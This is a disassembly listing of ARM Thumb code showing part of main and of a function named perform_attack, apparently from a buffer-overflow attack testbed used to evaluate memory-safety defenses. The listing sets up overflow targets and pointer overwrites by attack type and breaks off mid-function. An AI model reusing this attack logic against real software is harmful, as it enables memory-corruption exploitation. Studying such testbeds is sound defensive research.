    8f60:	f2c0 0301 	movt	r3, #1
    8f64:	2201      	movs	r2, #1
    8f66:	601a      	str	r2, [r3, #0]
    8f68:	f64c 1094 	movw	r0, #51604	; 0xc994
    8f6c:	f2c0 0000 	movt	r0, #0
    8f70:	f64c 11a4 	movw	r1, #51620	; 0xc9a4
    8f74:	f2c0 0100 	movt	r1, #0
    8f78:	2201      	movs	r2, #1
    8f7a:	f7ff ed20 	blx	89bc <_init+0x128>
    8f7e:	f64c 10ac 	movw	r0, #51628	; 0xc9ac
    8f82:	f2c0 0000 	movt	r0, #0
    8f86:	f64c 11bc 	movw	r1, #51644	; 0xc9bc
    8f8a:	f2c0 0100 	movt	r1, #0
    8f8e:	2201      	movs	r2, #1
    8f90:	f7ff ed14 	blx	89bc <_init+0x128>
    8f94:	f646 2380 	movw	r3, #27264	; 0x6a80
    8f98:	f2c0 0301 	movt	r3, #1
    8f9c:	681b      	ldr	r3, [r3, #0]
    8f9e:	2b00      	cmp	r3, #0
    8fa0:	d017      	beq.n	8fd2 <main+0x436>
    8fa2:	f64c 1094 	movw	r0, #51604	; 0xc994
    8fa6:	f2c0 0000 	movt	r0, #0
    8faa:	f7ff ecde 	blx	8968 <_init+0xd4>
    8fae:	4603      	mov	r3, r0
    8fb0:	f64c 10d4 	movw	r0, #51668	; 0xc9d4
    8fb4:	f2c0 0000 	movt	r0, #0
    8fb8:	4619      	mov	r1, r3
    8fba:	f7ff ec82 	blx	88c0 <_init+0x2c>
    8fbe:	f64c 10f4 	movw	r0, #51700	; 0xc9f4
    8fc2:	f2c0 0000 	movt	r0, #0
    8fc6:	f648 1198 	movw	r1, #35224	; 0x8998
    8fca:	f2c0 0100 	movt	r1, #0
    8fce:	f7ff ec78 	blx	88c0 <_init+0x2c>
    8fd2:	f002 ffb9 	bl	bf48 <is_attack_possible>
    8fd6:	4603      	mov	r3, r0
    8fd8:	2b00      	cmp	r3, #0
    8fda:	d027      	beq.n	902c <main+0x490>
    8fdc:	f507 73d0 	add.w	r3, r7, #416	; 0x1a0
    8fe0:	f5a3 73cc 	sub.w	r3, r3, #408	; 0x198
    8fe4:	f507 3144 	add.w	r1, r7, #200704	; 0x31000
    8fe8:	f501 71ce 	add.w	r1, r1, #412	; 0x19c
    8fec:	680a      	ldr	r2, [r1, #0]
    8fee:	f44f 71c4 	mov.w	r1, #392	; 0x188
    8ff2:	fb01 f202 	mul.w	r2, r1, r2
    8ff6:	4413      	add	r3, r2
    8ff8:	f507 3244 	add.w	r2, r7, #200704	; 0x31000
    8ffc:	f502 72cc 	add.w	r2, r2, #408	; 0x198
    9000:	6810      	ldr	r0, [r2, #0]
    9002:	f648 314d 	movw	r1, #35661	; 0x8b4d
    9006:	f2c0 0100 	movt	r1, #0
    900a:	461a      	mov	r2, r3
    900c:	f000 f822 	bl	9054 <perform_attack>
    9010:	f64c 2004 	movw	r0, #51716	; 0xca04
    9014:	f2c0 0000 	movt	r0, #0
    9018:	f7ff ecac 	blx	8974 <_init+0xe0>
    901c:	f646 2384 	movw	r3, #27268	; 0x6a84
    9020:	f2c0 0301 	movt	r3, #1
    9024:	681b      	ldr	r3, [r3, #0]
    9026:	2b00      	cmp	r3, #0
    9028:	d00d      	beq.n	9046 <main+0x4aa>
    902a:	e005      	b.n	9038 <main+0x49c>
    902c:	f64f 407c 	movw	r0, #64636	; 0xfc7c
    9030:	f6cf 70ff 	movt	r0, #65535	; 0xffff
    9034:	f7ff ecbc 	blx	89b0 <_init+0x11c>
    9038:	f507 3344 	add.w	r3, r7, #200704	; 0x31000
    903c:	f503 73cc 	add.w	r3, r3, #408	; 0x198
    9040:	6818      	ldr	r0, [r3, #0]
    9042:	f7ff ecf8 	blx	8a34 <_init+0x1a0>
    9046:	4618      	mov	r0, r3
    9048:	f507 3744 	add.w	r7, r7, #200704	; 0x31000
    904c:	f507 77d0 	add.w	r7, r7, #416	; 0x1a0
    9050:	46bd      	mov	sp, r7
    9052:	bd80      	pop	{r7, pc}

00009054 <perform_attack>:
    9054:	b5f0      	push	{r4, r5, r6, r7, lr}
    9056:	f5ad 3d52 	sub.w	sp, sp, #215040	; 0x34800
    905a:	b0b3      	sub	sp, #204	; 0xcc
    905c:	af02      	add	r7, sp, #8
    905e:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    9062:	3bb4      	subs	r3, #180	; 0xb4
    9064:	6018      	str	r0, [r3, #0]
    9066:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    906a:	3bb8      	subs	r3, #184	; 0xb8
    906c:	6019      	str	r1, [r3, #0]
    906e:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    9072:	3bbc      	subs	r3, #188	; 0xbc
    9074:	601a      	str	r2, [r3, #0]
    9076:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    907a:	f5a3 7331 	sub.w	r3, r3, #708	; 0x2c4
    907e:	f648 3265 	movw	r2, #35685	; 0x8b65
    9082:	f2c0 0200 	movt	r2, #0
    9086:	f8c3 2100 	str.w	r2, [r3, #256]	; 0x100
    908a:	2084      	movs	r0, #132	; 0x84
    908c:	f7ff ec78 	blx	8980 <_init+0xec>
    9090:	4603      	mov	r3, r0
    9092:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    9096:	f100 00a8 	add.w	r0, r0, #168	; 0xa8
    909a:	6003      	str	r3, [r0, #0]
    909c:	2084      	movs	r0, #132	; 0x84
    909e:	f7ff ec70 	blx	8980 <_init+0xec>
    90a2:	4603      	mov	r3, r0
    90a4:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    90a8:	f101 01a4 	add.w	r1, r1, #164	; 0xa4
    90ac:	600b      	str	r3, [r1, #0]
    90ae:	2084      	movs	r0, #132	; 0x84
    90b0:	f7ff ec66 	blx	8980 <_init+0xec>
    90b4:	4603      	mov	r3, r0
    90b6:	f507 3252 	add.w	r2, r7, #215040	; 0x34800
    90ba:	f102 02a0 	add.w	r2, r2, #160	; 0xa0
    90be:	6013      	str	r3, [r2, #0]
    90c0:	2300      	movs	r3, #0
    90c2:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    90c6:	f10c 0cb8 	add.w	ip, ip, #184	; 0xb8
    90ca:	f8cc 3000 	str.w	r3, [ip]
    90ce:	f44f 7082 	mov.w	r0, #260	; 0x104
    90d2:	f7ff ec56 	blx	8980 <_init+0xec>
    90d6:	4603      	mov	r3, r0
    90d8:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    90dc:	f100 009c 	add.w	r0, r0, #156	; 0x9c
    90e0:	6003      	str	r3, [r0, #0]
    90e2:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    90e6:	f101 019c 	add.w	r1, r1, #156	; 0x9c
    90ea:	680a      	ldr	r2, [r1, #0]
    90ec:	f648 3365 	movw	r3, #35685	; 0x8b65
    90f0:	f2c0 0300 	movt	r3, #0
    90f4:	f8c2 3100 	str.w	r3, [r2, #256]	; 0x100
    90f8:	f646 2380 	movw	r3, #27264	; 0x6a80
    90fc:	f2c0 0301 	movt	r3, #1
    9100:	681b      	ldr	r3, [r3, #0]
    9102:	2b00      	cmp	r3, #0
    9104:	d008      	beq.n	9118 <perform_attack+0xc4>
    9106:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    910a:	f5a3 7337 	sub.w	r3, r3, #732	; 0x2dc
    910e:	f507 3252 	add.w	r2, r7, #215040	; 0x34800
    9112:	f102 02b0 	add.w	r2, r2, #176	; 0xb0
    9116:	6013      	str	r3, [r2, #0]
    9118:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    911c:	f10c 0ca8 	add.w	ip, ip, #168	; 0xa8
    9120:	f8dc 3000 	ldr.w	r3, [ip]
    9124:	2b00      	cmp	r3, #0
    9126:	d006      	beq.n	9136 <perform_attack+0xe2>
    9128:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    912c:	f100 00a4 	add.w	r0, r0, #164	; 0xa4
    9130:	6803      	ldr	r3, [r0, #0]
    9132:	2b00      	cmp	r3, #0
    9134:	d108      	bne.n	9148 <perform_attack+0xf4>
    9136:	f64c 2014 	movw	r0, #51732	; 0xca14
    913a:	f2c0 0000 	movt	r0, #0
    913e:	f7ff ebfc 	blx	8938 <_init+0xa4>
    9142:	2001      	movs	r0, #1
    9144:	f7ff ec34 	blx	89b0 <_init+0x11c>
    9148:	f507 3251 	add.w	r2, r7, #214016	; 0x34400
    914c:	f502 7241 	add.w	r2, r2, #772	; 0x304
    9150:	f648 334d 	movw	r3, #35661	; 0x8b4d
    9154:	f2c0 0300 	movt	r3, #0
    9158:	6013      	str	r3, [r2, #0]
    915a:	f646 3324 	movw	r3, #27428	; 0x6b24
    915e:	f2c0 0301 	movt	r3, #1
    9162:	f648 324d 	movw	r2, #35661	; 0x8b4d
    9166:	f2c0 0200 	movt	r2, #0
    916a:	601a      	str	r2, [r3, #0]
    916c:	2300      	movs	r3, #0
    916e:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    9172:	f101 01ac 	add.w	r1, r1, #172	; 0xac
    9176:	600b      	str	r3, [r1, #0]
    9178:	4673      	mov	r3, lr
    917a:	f64c 2034 	movw	r0, #51764	; 0xca34
    917e:	f2c0 0000 	movt	r0, #0
    9182:	4619      	mov	r1, r3
    9184:	f7ff eb9c 	blx	88c0 <_init+0x2c>
    9188:	466b      	mov	r3, sp
    918a:	f64c 2040 	movw	r0, #51776	; 0xca40
    918e:	f2c0 0000 	movt	r0, #0
    9192:	4619      	mov	r1, r3
    9194:	f7ff eb94 	blx	88c0 <_init+0x2c>
    9198:	466b      	mov	r3, sp
    919a:	f503 3352 	add.w	r3, r3, #215040	; 0x34800
    919e:	33cc      	adds	r3, #204	; 0xcc
    91a0:	f507 3252 	add.w	r2, r7, #215040	; 0x34800
    91a4:	f102 0298 	add.w	r2, r2, #152	; 0x98
    91a8:	6013      	str	r3, [r2, #0]
    91aa:	f64c 204c 	movw	r0, #51788	; 0xca4c
    91ae:	f2c0 0000 	movt	r0, #0
    91b2:	f7ff ebe0 	blx	8974 <_init+0xe0>
    91b6:	2300      	movs	r3, #0
    91b8:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    91bc:	f10c 0cac 	add.w	ip, ip, #172	; 0xac
    91c0:	f8cc 3000 	str.w	r3, [ip]
    91c4:	e01e      	b.n	9204 <perform_attack+0x1b0>
    91c6:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    91ca:	f100 00ac 	add.w	r0, r0, #172	; 0xac
    91ce:	6803      	ldr	r3, [r0, #0]
    91d0:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    91d4:	f101 0198 	add.w	r1, r1, #152	; 0x98
    91d8:	680a      	ldr	r2, [r1, #0]
    91da:	4413      	add	r3, r2
    91dc:	781b      	ldrb	r3, [r3, #0]
    91de:	f64c 206c 	movw	r0, #51820	; 0xca6c
    91e2:	f2c0 0000 	movt	r0, #0
    91e6:	4619      	mov	r1, r3
    91e8:	f7ff eb6a 	blx	88c0 <_init+0x2c>
    91ec:	f507 3252 	add.w	r2, r7, #215040	; 0x34800
    91f0:	f102 02ac 	add.w	r2, r2, #172	; 0xac
    91f4:	6813      	ldr	r3, [r2, #0]
    91f6:	3301      	adds	r3, #1
    91f8:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    91fc:	f10c 0cac 	add.w	ip, ip, #172	; 0xac
    9200:	f8cc 3000 	str.w	r3, [ip]
    9204:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    9208:	f100 00ac 	add.w	r0, r0, #172	; 0xac
    920c:	6803      	ldr	r3, [r0, #0]
    920e:	2b3f      	cmp	r3, #63	; 0x3f
    9210:	ddd9      	ble.n	91c6 <perform_attack+0x172>
    9212:	200a      	movs	r0, #10
    9214:	f7ff ebfc 	blx	8a10 <_init+0x17c>
    9218:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    921c:	f101 0198 	add.w	r1, r1, #152	; 0x98
    9220:	680b      	ldr	r3, [r1, #0]
    9222:	f103 020c 	add.w	r2, r3, #12
    9226:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    922a:	f10c 0c98 	add.w	ip, ip, #152	; 0x98
    922e:	f8dc 3000 	ldr.w	r3, [ip]
    9232:	330c      	adds	r3, #12
    9234:	781b      	ldrb	r3, [r3, #0]
    9236:	f64c 2070 	movw	r0, #51824	; 0xca70
    923a:	f2c0 0000 	movt	r0, #0
    923e:	4611      	mov	r1, r2
    9240:	461a      	mov	r2, r3
    9242:	f7ff eb3e 	blx	88c0 <_init+0x2c>
    9246:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    924a:	f100 0098 	add.w	r0, r0, #152	; 0x98
    924e:	6803      	ldr	r3, [r0, #0]
    9250:	f103 0210 	add.w	r2, r3, #16
    9254:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    9258:	f101 0198 	add.w	r1, r1, #152	; 0x98
    925c:	680b      	ldr	r3, [r1, #0]
    925e:	3310      	adds	r3, #16
    9260:	781b      	ldrb	r3, [r3, #0]
    9262:	f64c 209c 	movw	r0, #51868	; 0xca9c
    9266:	f2c0 0000 	movt	r0, #0
    926a:	4611      	mov	r1, r2
    926c:	461a      	mov	r2, r3
    926e:	f7ff eb28 	blx	88c0 <_init+0x2c>
    9272:	f646 2388 	movw	r3, #27272	; 0x6a88
    9276:	f2c0 0301 	movt	r3, #1
    927a:	68db      	ldr	r3, [r3, #12]
    927c:	f5a3 73c8 	sub.w	r3, r3, #400	; 0x190
    9280:	2b03      	cmp	r3, #3
    9282:	f200 818e 	bhi.w	95a2 <perform_attack+0x54e>
    9286:	a201      	add	r2, pc, #4	; (adr r2, 928c <perform_attack+0x238>)
    9288:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
    928c:	0000929d 	.word	0x0000929d
    9290:	000093af 	.word	0x000093af
    9294:	0000948d 	.word	0x0000948d
    9298:	00009519 	.word	0x00009519
    929c:	f646 2388 	movw	r3, #27272	; 0x6a88
    92a0:	f2c0 0301 	movt	r3, #1
    92a4:	689b      	ldr	r3, [r3, #8]
    92a6:	f5b3 7f9c 	cmp.w	r3, #312	; 0x138
    92aa:	d109      	bne.n	92c0 <perform_attack+0x26c>
    92ac:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    92b0:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    92b4:	f507 5253 	add.w	r2, r7, #13504	; 0x34c0
    92b8:	f5a2 7231 	sub.w	r2, r2, #708	; 0x2c4
    92bc:	601a      	str	r2, [r3, #0]
    92be:	e187      	b.n	95d0 <perform_attack+0x57c>
    92c0:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    92c4:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    92c8:	f507 3250 	add.w	r2, r7, #212992	; 0x34000
    92cc:	f502 7240 	add.w	r2, r2, #768	; 0x300
    92d0:	601a      	str	r2, [r3, #0]
    92d2:	e02e      	b.n	9332 <perform_attack+0x2de>
    92d4:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    92d8:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    92dc:	681c      	ldr	r4, [r3, #0]
    92de:	f7ff eba4 	blx	8a28 <_init+0x194>
    92e2:	4601      	mov	r1, r0
    92e4:	f246 6367 	movw	r3, #26215	; 0x6667
    92e8:	f2c6 6366 	movt	r3, #26214	; 0x6666
    92ec:	fb83 c301 	smull	ip, r3, r3, r1
    92f0:	109a      	asrs	r2, r3, #2
    92f2:	17cb      	asrs	r3, r1, #31
    92f4:	1ad2      	subs	r2, r2, r3
    92f6:	4613      	mov	r3, r2
    92f8:	009b      	lsls	r3, r3, #2
    92fa:	4413      	add	r3, r2
    92fc:	005b      	lsls	r3, r3, #1
    92fe:	1aca      	subs	r2, r1, r3
    9300:	4613      	mov	r3, r2
    9302:	18e2      	adds	r2, r4, r3
    9304:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9308:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    930c:	601a      	str	r2, [r3, #0]
    930e:	f646 0360 	movw	r3, #26720	; 0x6860
    9312:	f2c0 0301 	movt	r3, #1
    9316:	681a      	ldr	r2, [r3, #0]
    9318:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    931c:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    9320:	681b      	ldr	r3, [r3, #0]
    9322:	4610      	mov	r0, r2
    9324:	f64c 21c8 	movw	r1, #51912	; 0xcac8
    9328:	f2c0 0100 	movt	r1, #0
    932c:	461a      	mov	r2, r3
    932e:	f7ff eb52 	blx	89d4 <_init+0x140>
    9332:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9336:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    933a:	681b      	ldr	r3, [r3, #0]
    933c:	4618      	mov	r0, r3
    933e:	f002 fb81 	bl	ba44 <contains_terminating_char>
    9342:	4603      	mov	r3, r0
    9344:	2b00      	cmp	r3, #0
    9346:	d1c5      	bne.n	92d4 <perform_attack+0x280>
    9348:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    934c:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    9350:	681a      	ldr	r2, [r3, #0]
    9352:	f507 3350 	add.w	r3, r7, #212992	; 0x34000
    9356:	f503 7340 	add.w	r3, r3, #768	; 0x300
    935a:	f503 7367 	add.w	r3, r3, #924	; 0x39c
    935e:	429a      	cmp	r2, r3
    9360:	d90f      	bls.n	9382 <perform_attack+0x32e>
    9362:	f646 0360 	movw	r3, #26720	; 0x6860
    9366:	f2c0 0301 	movt	r3, #1
    936a:	681b      	ldr	r3, [r3, #0]
    936c:	f64c 20d4 	movw	r0, #51924	; 0xcad4
    9370:	f2c0 0000 	movt	r0, #0
    9374:	2101      	movs	r1, #1
    9376:	2235      	movs	r2, #53	; 0x35
    9378:	f7ff eae4 	blx	8944 <_init+0xb0>
    937c:	2001      	movs	r0, #1
    937e:	f7ff eb18 	blx	89b0 <_init+0x11c>
    9382:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    9386:	f100 00a8 	add.w	r0, r0, #168	; 0xa8
    938a:	6803      	ldr	r3, [r0, #0]
    938c:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    9390:	f101 01b8 	add.w	r1, r1, #184	; 0xb8
    9394:	600b      	str	r3, [r1, #0]
    9396:	f507 3252 	add.w	r2, r7, #215040	; 0x34800
    939a:	f102 02a8 	add.w	r2, r2, #168	; 0xa8
    939e:	6813      	ldr	r3, [r2, #0]
    93a0:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    93a4:	f10c 0cb4 	add.w	ip, ip, #180	; 0xb4
    93a8:	f8cc 3000 	str.w	r3, [ip]
    93ac:	e110      	b.n	95d0 <perform_attack+0x57c>
    93ae:	f646 2388 	movw	r3, #27272	; 0x6a88
    93b2:	f2c0 0301 	movt	r3, #1
    93b6:	689a      	ldr	r2, [r3, #8]
    93b8:	f240 1339 	movw	r3, #313	; 0x139
    93bc:	429a      	cmp	r2, r3
    93be:	d10a      	bne.n	93d6 <perform_attack+0x382>
    93c0:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    93c4:	f100 009c 	add.w	r0, r0, #156	; 0x9c
    93c8:	6802      	ldr	r2, [r0, #0]
    93ca:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    93ce:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    93d2:	601a      	str	r2, [r3, #0]
    93d4:	e0fc      	b.n	95d0 <perform_attack+0x57c>
    93d6:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    93da:	f101 01a8 	add.w	r1, r1, #168	; 0xa8
    93de:	680a      	ldr	r2, [r1, #0]
    93e0:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    93e4:	f10c 0ca4 	add.w	ip, ip, #164	; 0xa4
    93e8:	f8dc 3000 	ldr.w	r3, [ip]
    93ec:	429a      	cmp	r2, r3
    93ee:	d236      	bcs.n	945e <perform_attack+0x40a>
    93f0:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    93f4:	f100 00a4 	add.w	r0, r0, #164	; 0xa4
    93f8:	6802      	ldr	r2, [r0, #0]
    93fa:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    93fe:	f101 01a0 	add.w	r1, r1, #160	; 0xa0
    9402:	680b      	ldr	r3, [r1, #0]
    9404:	429a      	cmp	r2, r3
    9406:	d22a      	bcs.n	945e <perform_attack+0x40a>
    9408:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    940c:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    9410:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    9414:	f10c 0ca8 	add.w	ip, ip, #168	; 0xa8
    9418:	f8dc 2000 	ldr.w	r2, [ip]
    941c:	601a      	str	r2, [r3, #0]
    941e:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    9422:	f100 00a4 	add.w	r0, r0, #164	; 0xa4
    9426:	6803      	ldr	r3, [r0, #0]
    9428:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    942c:	f101 01bc 	add.w	r1, r1, #188	; 0xbc
    9430:	600b      	str	r3, [r1, #0]
    9432:	f507 3252 	add.w	r2, r7, #215040	; 0x34800
    9436:	f102 02a0 	add.w	r2, r2, #160	; 0xa0
    943a:	6813      	ldr	r3, [r2, #0]
    943c:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    9440:	f10c 0cb8 	add.w	ip, ip, #184	; 0xb8
    9444:	f8cc 3000 	str.w	r3, [ip]
    9448:	f44f 70c4 	mov.w	r0, #392	; 0x188
    944c:	f7ff ea98 	blx	8980 <_init+0xec>
    9450:	4603      	mov	r3, r0
    9452:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    9456:	f100 00b4 	add.w	r0, r0, #180	; 0xb4
    945a:	6003      	str	r3, [r0, #0]
    945c:	e0b8      	b.n	95d0 <perform_attack+0x57c>
    945e:	f646 0350 	movw	r3, #26704	; 0x6850
    9462:	f2c0 0301 	movt	r3, #1
    9466:	681b      	ldr	r3, [r3, #0]
    9468:	2b00      	cmp	r3, #0
    946a:	d00c      	beq.n	9486 <perform_attack+0x432>
    946c:	f646 0360 	movw	r3, #26720	; 0x6860
    9470:	f2c0 0301 	movt	r3, #1
    9474:	681b      	ldr	r3, [r3, #0]
    9476:	f64c 300c 	movw	r0, #51980	; 0xcb0c
    947a:	f2c0 0000 	movt	r0, #0
    947e:	2101      	movs	r1, #1
    9480:	2232      	movs	r2, #50	; 0x32
    9482:	f7ff ea60 	blx	8944 <_init+0xb0>
    9486:	2001      	movs	r0, #1
    9488:	f7ff ea92 	blx	89b0 <_init+0x11c>
    948c:	f646 2388 	movw	r3, #27272	; 0x6a88
    9490:	f2c0 0301 	movt	r3, #1
    9494:	689a      	ldr	r2, [r3, #8]
    9496:	f240 133b 	movw	r3, #315	; 0x13b
    949a:	429a      	cmp	r2, r3
    949c:	d109      	bne.n	94b2 <perform_attack+0x45e>
    949e:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    94a2:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    94a6:	f646 3228 	movw	r2, #27432	; 0x6b28
    94aa:	f2c0 0201 	movt	r2, #1
    94ae:	601a      	str	r2, [r3, #0]
    94b0:	e08e      	b.n	95d0 <perform_attack+0x57c>
    94b2:	f646 432c 	movw	r3, #27692	; 0x6c2c
    94b6:	f2c0 0301 	movt	r3, #1
    94ba:	4618      	mov	r0, r3
    94bc:	f002 fac2 	bl	ba44 <contains_terminating_char>
    94c0:	4603      	mov	r3, r0
    94c2:	2b00      	cmp	r3, #0
    94c4:	d009      	beq.n	94da <perform_attack+0x486>
    94c6:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    94ca:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    94ce:	f646 4230 	movw	r2, #27696	; 0x6c30
    94d2:	f2c0 0201 	movt	r2, #1
    94d6:	601a      	str	r2, [r3, #0]
    94d8:	e008      	b.n	94ec <perform_attack+0x498>
    94da:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    94de:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    94e2:	f646 422c 	movw	r2, #27692	; 0x6c2c
    94e6:	f2c0 0201 	movt	r2, #1
    94ea:	601a      	str	r2, [r3, #0]
    94ec:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    94f0:	f101 01a8 	add.w	r1, r1, #168	; 0xa8
    94f4:	680b      	ldr	r3, [r1, #0]
    94f6:	f507 3252 	add.w	r2, r7, #215040	; 0x34800
    94fa:	f102 02b8 	add.w	r2, r2, #184	; 0xb8
    94fe:	6013      	str	r3, [r2, #0]
    9500:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    9504:	f10c 0ca8 	add.w	ip, ip, #168	; 0xa8
    9508:	f8dc 3000 	ldr.w	r3, [ip]
    950c:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    9510:	f100 00b4 	add.w	r0, r0, #180	; 0xb4
    9514:	6003      	str	r3, [r0, #0]
    9516:	e05b      	b.n	95d0 <perform_attack+0x57c>
    9518:	f646 2388 	movw	r3, #27272	; 0x6a88
    951c:	f2c0 0301 	movt	r3, #1
    9520:	689b      	ldr	r3, [r3, #8]
    9522:	f5b3 7f9d 	cmp.w	r3, #314	; 0x13a
    9526:	d109      	bne.n	953c <perform_attack+0x4e8>
    9528:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    952c:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    9530:	f246 724c 	movw	r2, #26444	; 0x674c
    9534:	f2c0 0201 	movt	r2, #1
    9538:	601a      	str	r2, [r3, #0]
    953a:	e049      	b.n	95d0 <perform_attack+0x57c>
    953c:	f246 63c0 	movw	r3, #26304	; 0x66c0
    9540:	f2c0 0301 	movt	r3, #1
    9544:	4618      	mov	r0, r3
    9546:	f002 fa7d 	bl	ba44 <contains_terminating_char>
    954a:	4603      	mov	r3, r0
    954c:	2b00      	cmp	r3, #0
    954e:	d009      	beq.n	9564 <perform_attack+0x510>
    9550:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9554:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    9558:	f246 62c4 	movw	r2, #26308	; 0x66c4
    955c:	f2c0 0201 	movt	r2, #1
    9560:	601a      	str	r2, [r3, #0]
    9562:	e008      	b.n	9576 <perform_attack+0x522>
    9564:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    9568:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    956c:	f246 62c0 	movw	r2, #26304	; 0x66c0
    9570:	f2c0 0201 	movt	r2, #1
    9574:	601a      	str	r2, [r3, #0]
    9576:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    957a:	f101 01a8 	add.w	r1, r1, #168	; 0xa8
    957e:	680b      	ldr	r3, [r1, #0]
    9580:	f507 3252 	add.w	r2, r7, #215040	; 0x34800
    9584:	f102 02b8 	add.w	r2, r2, #184	; 0xb8
    9588:	6013      	str	r3, [r2, #0]
    958a:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    958e:	f10c 0ca8 	add.w	ip, ip, #168	; 0xa8
    9592:	f8dc 3000 	ldr.w	r3, [ip]
    9596:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    959a:	f100 00b4 	add.w	r0, r0, #180	; 0xb4
    959e:	6003      	str	r3, [r0, #0]
    95a0:	e016      	b.n	95d0 <perform_attack+0x57c>
    95a2:	f646 0350 	movw	r3, #26704	; 0x6850
    95a6:	f2c0 0301 	movt	r3, #1
    95aa:	681b      	ldr	r3, [r3, #0]
    95ac:	2b00      	cmp	r3, #0
    95ae:	d00c      	beq.n	95ca <perform_attack+0x576>
    95b0:	f646 0360 	movw	r3, #26720	; 0x6860
    95b4:	f2c0 0301 	movt	r3, #1
    95b8:	681b      	ldr	r3, [r3, #0]
    95ba:	f64c 3040 	movw	r0, #52032	; 0xcb40
    95be:	f2c0 0000 	movt	r0, #0
    95c2:	2101      	movs	r1, #1
    95c4:	2222      	movs	r2, #34	; 0x22
    95c6:	f7ff e9be 	blx	8944 <_init+0xb0>
    95ca:	2001      	movs	r0, #1
    95cc:	f7ff e9f0 	blx	89b0 <_init+0x11c>
    95d0:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    95d4:	f101 01b8 	add.w	r1, r1, #184	; 0xb8
    95d8:	680b      	ldr	r3, [r1, #0]
    95da:	2b00      	cmp	r3, #0
    95dc:	d009      	beq.n	95f2 <perform_attack+0x59e>
    95de:	f507 3352 	add.w	r3, r7, #215040	; 0x34800
    95e2:	f103 03b8 	add.w	r3, r3, #184	; 0xb8
    95e6:	681a      	ldr	r2, [r3, #0]
    95e8:	f648 3365 	movw	r3, #35685	; 0x8b65
    95ec:	f2c0 0300 	movt	r3, #0
    95f0:	6013      	str	r3, [r2, #0]
    95f2:	f646 2388 	movw	r3, #27272	; 0x6a88
    95f6:	f2c0 0301 	movt	r3, #1
    95fa:	681b      	ldr	r3, [r3, #0]
    95fc:	2b64      	cmp	r3, #100	; 0x64
    95fe:	d003      	beq.n	9608 <perform_attack+0x5b4>
    9600:	2b65      	cmp	r3, #101	; 0x65
    9602:	f000 810f 	beq.w	9824 <perform_attack+0x7d0>
    9606:	e172      	b.n	98ee <perform_attack+0x89a>
    9608:	f646 2388 	movw	r3, #27272	; 0x6a88
    960c:	f2c0 0301 	movt	r3, #1
    9610:	689b      	ldr	r3, [r3, #8]
    9612:	f5a3 7396 	sub.w	r3, r3, #300	; 0x12c
    9616:	2b0f      	cmp	r3, #15
